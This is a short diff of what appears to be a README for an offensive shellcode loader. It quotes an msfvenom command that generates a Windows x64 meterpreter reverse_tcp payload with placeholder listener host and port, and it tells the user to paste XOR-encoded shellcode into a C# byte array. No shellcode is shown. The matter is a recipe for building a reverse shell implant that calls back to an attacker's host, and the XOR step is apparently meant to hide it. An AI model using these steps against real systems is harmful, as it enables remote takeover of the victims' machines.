@@ -13,4 +13,4 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IPADRESS> lport=<PORTNUMB
 
 replace bytesize and shellcode in line 162:
 
-byte[] xorshellcode = new byte[<YOUR BYTESIZE HERE>] {<YOUR SHELLCODE HERE>};
+byte[] xorshellcode = new byte[BYTESIZE] {SHELLCODE};
